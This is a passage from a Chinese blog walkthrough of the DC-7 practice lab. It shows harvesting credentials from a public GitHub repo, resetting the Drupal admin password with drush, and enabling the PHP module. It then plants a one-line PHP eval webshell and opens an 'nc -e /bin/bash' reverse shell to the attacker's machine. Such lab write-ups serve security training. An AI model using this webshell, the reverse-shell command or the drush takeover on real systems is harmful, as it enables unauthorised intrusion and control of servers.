更多说明已经发送至您的邮箱地址</p><p>这里说明，有一个合法的用户名一定为<code>admin</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721978616197.png" alt="img"></p><p>尝试使用<code>admin 123456</code>进行登陆，抓包查看是什么情况</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721978973726.png" alt="img"></p><p>但是放行完毕之后显示了错误，如下图，其中抓取的有明文登陆信息的数据包如上所示。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721978991720.png" alt="img"></p><p>尝试点击<code>Reset your password</code>，会发现，它又跳转回这个password界面了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721979099041.png" alt="img"></p><p>那既然如此，要不填一下我的邮箱？笨笨！那肯定不行啊！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721979559988.png" alt="img"></p><p>尝试强行获取合法的用户名密码这条路暂时走不通了。</p><h3 id="网页信息提示"><a href="#网页信息提示" class="headerlink" title="网页信息提示"></a>网页信息提示</h3><p>返回目标网站的首页，再次仔细查看所有的提示。</p><p>整个网页显示界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721979915603.png" alt="img"></p><p>组成要素有：左上角<code>Home</code>目录，接下来是<code>Search</code>搜索框，然后其右边是一个欢迎提示，提示我们要跳出惯性思维的。然后左下角是<code>Powered by [Drupal](https://www.drupal.org)</code>表示该网站由Drupal提供支持，然后下面还有个<code>@DC7USER</code>。</p><p>首先，我们可以先来顺一下平常打靶场的惯性思维是什么，首先肯定是查找网页框架漏洞，尝试利用漏洞Getshell（或提权），或者是通过目录爆破或密码爆破，获得合法的用户账户。然后想办法反弹shell，查找用户目录下的文件或利用命令提权，最终找到flag文件。</p><p>既然这里提示说要远远跳出惯性思维，那就是说，这里办法对于这个目标靶场都不行。</p><p>因此，我们就需要关注一些可能平常并不会注意到的其它有用的信息。</p><p>比如上面在展示技术支持之后的<code>@DC7USER</code>，如果连接上上面的<code>Powered by</code>的话，也可以理解为<code>由DC7USER和Drupal提供支持</code>，那这个<code>DC7USER</code>可能就是一个有贡献的技术人员，可以尝试去通过网页搜索一下这个名字。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721980846000.png" alt="img"></p><p>我嘞个豆，还真有这个github账户。点进去看看。发现有一个<code>staffdb</code>仓库，继续点进去查看。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721980955536.png" alt="img"></p><h3 id="DC7USER的staffdb仓库信息检索"><a href="#DC7USER的staffdb仓库信息检索" class="headerlink" title="DC7USER的staffdb仓库信息检索"></a>DC7USER的staffdb仓库信息检索</h3><p>首先，查看<code>Readme</code>文件，说这个仓库中包含了一些代码，关于改变的代码。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721982451326.png" alt="img"></p><p>对仓库中的文件进行逐一排查，发现在<code>config.php</code>代码文件中出现了用户名密码等信息：</p><blockquote><p>servername &#x3D; localhost</p><p>username &#x3D; dc7user</p><p>password &#x3D; MdR3xOgB7#dW</p><p>dbname &#x3D; Staff</p><p>conn &#x3D; mysqli_connect($servername, $username, $password, $dbname);</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721982622019.png" alt="img"></p><p>在<code>createmany.php</code>中发现了疑似职员的两条信息，分别是CEO Mary和人事 Julie。</p><blockquote><p>‘Mary’, ‘Moe’, ‘CEO’, ‘46478415155456’, ‘<a href="mailto:&#x6d;&#97;&#x72;&#x79;&#64;&#101;&#120;&#x61;&#109;&#112;&#108;&#101;&#x2e;&#99;&#111;&#109;">&#x6d;&#97;&#x72;&#x79;&#64;&#101;&#120;&#x61;&#109;&#112;&#108;&#101;&#x2e;&#99;&#111;&#109;</a>‘</p><p>‘Julie’, ‘Dooley’, ‘Human Resources’, ‘46457131654’, ‘<a href="mailto:&#x6a;&#x75;&#x6c;&#x69;&#101;&#64;&#101;&#120;&#x61;&#x6d;&#112;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d;">&#x6a;&#x75;&#x6c;&#x69;&#101;&#64;&#101;&#120;&#x61;&#x6d;&#112;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d;</a>‘</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721982882990.png" alt="img"></p><p>然后其它的php代码文件也没啥有用的信息了。</p><h2 id="用户登陆"><a href="#用户登陆" class="headerlink" title="用户登陆"></a>用户登陆</h2><p>即：<code>获得目标用户的命令执行权限以及操作界面</code></p><p>上面信息检索获取到的有用信息如下，其中包含了明文形式的用户名和密码：</p><blockquote><p>servername &#x3D; localhost</p><p>username &#x3D; dc7user</p><p>password &#x3D; MdR3xOgB7#dW</p><p>dbname &#x3D; Staff</p><p>conn &#x3D; mysqli_connect($servername, $username, $password, $dbname);</p></blockquote><p><strong>（1）首先，先尝试连接一下mysql数据库呗</strong></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721983651021.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721983736766.png" alt="img"></p><p>但是发现不大行，密码正确但是访问被拒绝。修改一下主机信息为目标靶机的IP地址，再次尝试：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721983815703.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721983847338.png" alt="img"></p><p>发现无法连接惹。后面查找资料说可能端口号也得改，尝试修改之后还是无法连接。</p><ul><li><strong>嘻嘻，介绍一下使用命令行连接MySQL数据库的方法</strong></li></ul><p><a href="https://blog.csdn.net/qq_41062572/article/details/103234358">mysql使用cmd命令行方式连接数据库</a></p><p><code>mysql -h 本机地址 -u 用户名 -p 密码</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721991581789.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721991661140.png" alt="img"></p><p>- </p><p>那就使用上述获取的用户名和密码分别进行<strong>登陆界面测试</strong>和<strong>远程ssh连接测试</strong>。</p><blockquote><p>username &#x3D; dc7user</p><p>password &#x3D; MdR3xOgB7#dW</p></blockquote><p><strong>（2）登陆界面登陆</strong></p><p><a href="http://192.168.204.136/user/login/">http://192.168.204.136/user/login/</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721991869898.png" alt="img"></p><p>发现登陆失败。</p><p><strong>（3）ssh远程连接登陆</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh dc7user@192.168.204.136<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721992090749.png" alt="img"></p><p>发现登陆成功！注意哦！这里登陆的dc7user账户并不一定是目标靶机的合法用户。根据已有的提示，他是目标靶机的相关技术人员。我们获得他的shell之后可以搜寻更多能够帮助我们get到目标靶机shell的信息。</p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><h3 id="dc7user账户信息检索"><a href="#dc7user账户信息检索" class="headerlink" title="dc7user账户信息检索"></a>dc7user账户信息检索</h3><p>首先可以先明确一点，就是，尽管我们拿到的不是目标靶机的shell，但是为什么也要尝试提权，因为这个用户是技术提供者，管理员权限下说不定会有更加重要的文件或数据，这些数据对我们get目标靶机的shell很有帮助。</p><p>查看具有SIUD权限的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721992165793.png" alt="img"></p><p>根据以往的经验，比较大可能能够提权成功的命令为：<code>exim4</code></p><p>查看sudo配置信息，<code>sudo -l</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721992327583.png" alt="img"></p><p>发现sudo命令被限制了。</p><p>查看当前用户目录列表，<code>ls</code>，发现有两个文件：<code>backups</code> 、<code>mbox</code></p><p>· 查看<code>backups</code> 文件夹，其包含了两个gpg后缀的文件，一个应该跟数据库有关，另一个和压缩文件有关</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721992484900.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721992472967.png" alt="img"></p><blockquote><ul><li>.tgz.gpg加密文件的解压</li></ul><p>以input_file.tgz.gpg 文件为例，需要先将其解密（用gpg命令）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpg --output output_file.tgz --decrypt input_file.tgz.gpg<br>tar -xvzf output_file.tgz<br></code></pre></td></tr></table></figure><p>然后会提示输入密钥….输入后回车，密钥正确的话就会得到output_file.tgz 文件，然后用tar命令解压.tgz就可以了</p><ul><li>.sql.gpg加密文件的解压</li></ul><p>同样需要密钥。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpg --decrypt filename.sql.gpg &gt; filename.sql<br></code></pre></td></tr></table></figure></blockquote><p>咦~，本来想退回上级目录，继续查看第二个文件的，这个时候突然收到一条邮件信息：</p><p><code>/var/mail/dc7user</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721992957913.png" alt="img"></p><p>但是还是先查看<code>mbox</code>文件吧</p><p>· <code>mbox</code>，cat命令获取该文件的内容。哟嚯，不会是邮箱mailbox吧！！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721993115456.png" alt="img"></p><p>比较显眼的信息：<code>Database dump saved to /home/dc7user/backups/website.sql</code></p><p>· 去<code>/var/mail/dc7user</code>查看新接收到的信息</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721993415979.png" alt="img"></p><p>和上述<code>mbox</code>显示出来的信息差不多，基本都指向我们要获取<code>/home/dc7user/backups/website.sql</code>这个文件。</p><p>另外，这些操作记录还有一个提示，使用的exim版本是：<code>Exim 4.89</code>，后面可以尝试通过搜查和利用漏洞getshell。</p><h4 id="1-website-sql-gpg文件解密"><a href="#1-website-sql-gpg文件解密" class="headerlink" title="1.website.sql.gpg文件解密"></a>1.website.sql.gpg文件解密</h4><p>尝试使用上述获得的用户密码来对gpg文件进行解密</p><blockquote><p>username &#x3D; dc7user</p><p>password &#x3D; MdR3xOgB7#dW</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpg --decrypt website.sql.gpg &gt; website.sql<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721993729714.png" alt="img"></p><p>密码错误，解密失败。</p><p>回顾上面的操作记录信息，可以得知其使用了<code>/opt/scripts/backups.sh</code>D的备份脚本文件进行备份。那就看看它的具体内容，看看有什么提示。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721993959343.png" alt="img"></p><blockquote><p>.sh脚本程序的代码含义如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">rm</span> /home/dc7user/backups/*<br><span class="hljs-built_in">cd</span> /var/www/html/<br>drush sql-dump --result-file=/home/dc7user/backups/website.sql<br><span class="hljs-built_in">cd</span> ..<br>tar -czf /home/dc7user/backups/website.tar.gz html/<br>gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql<br>gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz<br><span class="hljs-built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*<br><span class="hljs-built_in">rm</span> /home/dc7user/backups/website.sql<br><span class="hljs-built_in">rm</span> /home/dc7user/backups/website.tar.gz<br></code></pre></td></tr></table></figure><p>指定使用bash解释器来执行</p><p>删除 &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F; 目录下的所有文件，注意哦，不会删除子目录，只删除文件</p><p>切换到 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录（web服务器的根目录）</p><p>使用<code>drush</code> Drupal shell 工具生成数据库备份，sql-dump命令将Drupal数据库导出到目标文件中</p><p>返回上一级目录</p><p>使用tar命令将 html&#x2F; 目录压缩成一个gzip格式的文件</p><p>使用<code>gpg</code>对 &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql 文件进行对称加密，并指定用于加密的密码</p><p>使用<code>gpg</code>对 &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz 文件进行对称加密，密码与之前的相同</p><p>将 &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F; 目录下所有文件的所有权更改为 dc7user 用户及其组，包括之前加密的文件。</p><p>删除未加密的 website.sql 文件</p><p>删除未加密的 website.tar.gz 文件</p></blockquote><p>程序执行之后会删掉那些明文文件。我在想，要不修改一下文件然后，删掉那些删除命令，看看能不能行。</p><p>先尝试执行<code>/opt/scripts/backups.sh</code>看看自己是否有执行权限吧。</p><p>哦豁！成功了！说明我们有执行权限。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721994182667.png" alt="img"></p><p>使用<code>nano</code>命令进入该.sh文件</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721994385247.png" alt="img"></p><p>发现这里提示不可写。那我们就尝试使用替代命令：<code>ctrl+\</code>，删掉最后两行。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721994686896.png" alt="img"></p><p>但是在执行保存的时候被拒绝执行了。</p><p>那我们可以新建一个文件啊，替换掉原来的。通过尝试，发现也不行。</p><p>总的来说，我们有权限执行<code>backups.sh</code>文件，但尝试修改<code>backups.sh</code>脚本文件失败。</p><h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h4><p>既然尝试修改<code>backups.sh</code>文件失败，那就尝试漏洞搜寻，看看能不能利用漏洞提权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721995081467.png" alt="img"></p><p>刚好发现有一个符合版本条件的。使用<code>-p</code>选项查看其详细信息。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721995160390.png" alt="img"></p><p>cat一下查看文件的详细内容。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721995287152.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721995312041.png" alt="img"></p><p>通过漏洞版本右边的提示<code>&#39;BDAT&#39; Denial of Service </code>可以知道它使用的是<code>BDAT拒绝服务攻击&#39;</code>，有关这个攻击的介绍好像比较少：<a href="https://ti.qianxin.com/uploads/2018/01/26/12bf53828dc9c468e47104459b0f2bbc.pdf">Exim 服务器 BDAT 指令远程代码执行漏洞-奇安信报告</a>，虽然它给出了利用命令，但是不大确定行不行啊。</p><p>而且尝试过后，命令报错了。可能还得做其它的设置，有点麻烦。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721995866099.png" alt="img"></p><p>使用<code>Metasploit</code>找一找吧！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search exim 4<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721995952245.png" alt="img"></p><p>发现编号为1的漏洞，其exim版本号刚好符合我们的要求，而且危险等级也是excellent，时间也很新。尝试利用一下这个漏洞。</p><p><a href="https://www.cnblogs.com/R1card0/articles/12960290.html">metasploit实战（一）local_exploit_suggester提权</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721996262841.png" alt="img"></p><p>emm……不会利用啊（上面的链接看着挺类似，但是稍微复杂）。明显，要是我们死磕漏洞利用的话，那可能会花费很多时间。</p><p>码垛！看来又得切换思路了。</p><h4 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="3.命令执行"></a>3.命令执行</h4><p>之前我们使用find命令对具有SUID权限的命令进行了搜索，也对其中提权成功的可能性较高的命令进行了尝试，但是发现均行不通。</p><p>不过别灰心，我们在上一步信息检索的时候发现了 <code>/opt/scripts/backups.sh</code>这个重要的文件，而且通过测试发现我们对这个脚本文件具有执行权限。言外之意就是，对脚本中使用到的所有命令都具有执行权限。</p><p>脚本中使用到的关键命令为：<code>drush</code>和<code>gpg</code>。</p><p>在脚本文件中。<code>drush</code> Drupal shell 工具主要用于生成数据库备份，sql-dump命令将Drupal数据库导出到目标文件中。<code>gpg</code>主要对文件进行加密。</p><p>通过网络搜索查找关于这两个命令的更详细功能：</p><blockquote><p><code>drush</code>：是一个shell接口，可以直接从云服务器使用命令行管理Drupal。</p><p><a href="https://blog.csdn.net/xuanunix/article/details/135921223">Drush初学者指南：Drupal Shell</a></p><p><a href="https://blog.csdn.net/single_g_l/article/details/126322111">Drupal drush 常用命令</a></p><p>其中，提到了<code>drush</code>拥有更改用户密码的功能：</p><p><code>drush user-password admin --password=&quot;new_pass&quot;</code></p><p><code>gpg</code>：对文件进行加密&#x2F;解密&#x2F;签名。</p><p><a href="https://blog.csdn.net/willingtolove/article/details/122362705">GPG使用方法总结（密钥管理，加解密文件）</a></p></blockquote><p>利用<code>drush</code>拥有更改用户密码的功能，我们是否能够修改root用户的密码呢！</p><p>可以尝试一下！首先，我们之前在进行网页信息检索测试的时候，发现了<code>admin</code>是目标网站的一个合法用户名，那么我们可以尝试对该用户进行密码更新，再通过ssh连接或者su用户切换验证效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">drush user-password admin --password=<span class="hljs-string">&quot;123456&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722004424388.png" alt="img"></p><p>发生错误提示：</p><blockquote><p>Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command. The drush command ‘user-password admin’ could not be executed.  </p><p>言外之意就是要找到更高级别的引导权限目录才能成功执行drush命令呗。    </p></blockquote><p>因为drush是一款Drupal shell工具，Drupal又是一个网页CMS框架，直接去web服务器的根目录进行操作呗，试试看。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/<br>drush user-password admin --password=<span class="hljs-string">&quot;123456&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722005001057.png" alt="img"></p><p>修改成功！</p><p>之前是在网页的登陆网站上发现了提示”admin“为合法用户的信息，而且drush工具也是在web服务器的根目录下才运行成功的，那验证自然也去登陆网页上进行验证。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722005189250.png" alt="img"></p><p>成功了捏！登陆了管理员系统。</p><p>在dc7user账户信息检索过程中，虽然我们没有成功提权，获得数据库备份数据文件，但是我们通过了drush工具成功修改了管理员的网页系统账户。也算是一个大大的收获</p><h3 id="后台管理系统信息检索"><a href="#后台管理系统信息检索" class="headerlink" title="后台管理系统信息检索"></a>后台管理系统信息检索</h3><p>回顾之前通过网页进行getshell的操作，无非是①利用注入点上传一句话木马然后用中国蚁剑进行连接触发，②利用文件包含等漏洞注入一句话木马或反弹shell命令。</p><p>所以对于这个后台管理系统的网页，要想getshell也是同理。</p><p>如果从漏洞利用入手的话可能比较困难，因为在对之前的目录列表进行检索的过程中，并没有什么组成要素是明显地能看出来是属于两个文件的，也就是说文件包含漏洞暂时无法利用；通过之前的nmap扫描可以得知目标网站使用的CMS 框架是 Drupal 在之前对dc7user进行提权的时候我们尝试过漏洞利用，但是失败了。</p><p>所以我们的重点可以放在寻找可以注入一句话木马的注入点注入一句话木马来尝试getshell。</p><p>在搜索<code>content</code>板块的时候，我们看到了我们之前在以游客身份访问目标网站的时候出现的所有可能响应界面内容，可以看到它们的内容类型都是<code>Basic page</code>。用户通过网站提交请求后会根据后台设置的不同条件返回相应的响应界面给操作用户。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722084389560.png" alt="img"></p><p>点进去欢迎界面进行查看：</p><p>有标题、内容以及文本格式等可操作选项。既然网站能够执行并响应显示这些内容，说明后台可能对这几部分内容有对应的代码操作模块。</p><p>也就是说，这里可以作为一个一句话木马的注入点。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722084587047.png" alt="img"></p><p>尝试新建一个页面，在<code>body</code>处写入一句话木马：</p><blockquote><?php @eval($_POST['shell']); ?></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722084234331.png" alt="img"></p><p>写入的一句话木马是php文件，格式自然对应php，但是在下方的文件格式并没有php格式选项。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722084968257.png" alt="img"></p><p>通过搜索，可以知道Drupal 8 为了安全，已经默认不添加php格式解析模块，需要用户手动到扩展模块添加。</p><p>首先就是要查找php模块包的下载地址。</p><p>根据提示信息，那就点击超链接去<code>modules</code>模块寻找我们所需要的php模块包。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722085979531.png" alt="img"></p><p>搜索信息：drupal 8版本、php模块</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722086362763.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087300866.png" alt="img"></p><p>点击下面的<code>Read more</code>，下滑，可以看到有相应版本的压缩包。查看所有版本。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087351360.png" alt="img"></p><p>选择第一个进行下载吧，它看着好像挺可靠的。没有红的也没有黄的。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087443573.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087601508.png" alt="img"></p><p>右键复制下载链接地址，可别点击下到自己的主机了，没用的捏。</p><p>php模块包的下载地址：</p><blockquote><p><a href="https://ftp.drupal.org/files/projects/php-8.x-1.2.tar.gz">https://ftp.drupal.org/files/projects/php-8.x-1.2.tar.gz</a></p></blockquote><p>回到模块下载页面，输入链接进行下载：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087651737.png" alt="img"></p><p>是太安全了吗？（流汗黄豆）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087719295.png" alt="img"></p><p>换第二个不安全的链接试试：</p><blockquote><p><a href="https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz">https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz</a></p></blockquote><p>噢！码垛，真给他下载成功了。（两颗流汗黄豆）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087831235.png" alt="img"></p><p>选择如下选项：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087887054.png" alt="img"></p><p>返回之前要注入一句话木马的界面，发现这个时候还是没有php格式的选项：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087999896.png" alt="img"></p><p>去扩展模块搜搜看是怎么回事吧。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088047212.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088082600.png" alt="img"></p><p>还需要下载！！！！</p><p>现在再回去看，就发现已经有了<code>PHP code</code>选项  </p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088121510.png" alt="img"></p><h3 id="一句话木马注入"><a href="#一句话木马注入" class="headerlink" title="一句话木马注入"></a>一句话木马注入</h3><blockquote><?php @eval($_POST['shell']); ?></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088257803.png" alt="img"></p><p>保存<code>Save</code>，然后就会跳转到该网页：<a href="http://192.168.204.136/node/4">http://192.168.204.136/node/4</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088339240.png" alt="img"></p><p>使用中国蚁剑进行连接测试。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088475791.png" alt="img"></p><p>码垛，逆子！</p><p>想开点，或许是新建的网页页面没有权限呢！</p><p>那直接对首页页面进行修改注入吧</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088595614.png" alt="img"></p><p>仍然报错。</p><blockquote><p>码垛！从最开始进行一句话木马的时候就已经错了。不是随便在哪种文档格式<code>text format</code>下写入再转换都行，会发生歧义的。</p><p>由于编辑界面进去，原文件默认使用的是html格式，所以会默认选择并以html格式显示数据。如果在该格式下直接将一句话木马复制上去的话，那就会被浏览器当作是html文本，再切换为<code>PHP code</code>的时候就会被浏览器解析成将一句话木马的文本转换为php格式。与我们写入的语义完全不一样了。</p><p>那个<code>&lt;P&gt;&lt;/P&gt;</code>标签就表示了其中的一句话内容是文本。那测试连接又怎么会成功执行一句话木马？</p><p>所以，需要一开始就先转化为<code>PHP code</code>，再复制一句话木马进去。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722091222475.png" alt="img"></p><p>要让一句话木马在<code>PHP code</code>格式下也显示为我们复制进去的模样。</p><p>在中国蚁剑测试连接：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722091249617.png" alt="img"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>打开虚拟终端，执行反弹shell命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash 192.168.204.128 9999<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722091441795.png" alt="img"></p><p>提前在终端打开监听，成功get到反弹来的shell。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722091421612.png" alt="img"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看具有SUID权限的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722092334695.png" alt="img"></p><p>同样的，参照以往的经验，成功率较大的命令提权是exim4，根据上述开发者提供的信息，使用的是exim 4.89，在尝试利用的时候，发现它主要是通过<code>BDAT拒绝服务攻击</code>实现的。有关于这个漏洞攻击的参考资料较少，相关的参考，其实现起来也比较复杂。</p><p>尝试切换思路。对开发者账户的那个<code>backups.sh</code>耿耿于怀。</p><p>之前我们在开发者账户中，通过尝试证明了我们（开发者普通用户状态）具有执行脚本的权限，但是没有修改脚本的权限。显然，修改脚本文件所需要的权限更高。</p><p>使用<code>ls -l</code>查看该脚本文件的属主和属组情况。（当然是在开发者账户哈）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722092909249.png" 